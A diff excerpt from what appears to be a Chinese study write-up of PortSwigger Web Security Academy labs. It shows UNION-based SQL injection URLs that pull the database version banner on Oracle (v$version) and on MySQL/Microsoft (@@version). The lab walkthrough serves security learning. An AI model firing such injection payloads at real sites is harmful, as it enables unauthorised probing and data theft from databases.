@@ -26,3 +26,10 @@
 
 通过资料可以发现，Oracle中查询版本的语句为`SELECT banner FROM v$version`和`SELECT version FROM v$instance
 `，我们以前者为例子，直接修改之前的select语句即可，例如`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+null,banner+from+v$version--+`，这里的`null`可以换成`%271%27`或直接`banner`。
+
+## SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+> 与上一个一样，不过就是后端不一样，换一些语法就可以了。
+
+`https://xxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+1,@@version--+`
+
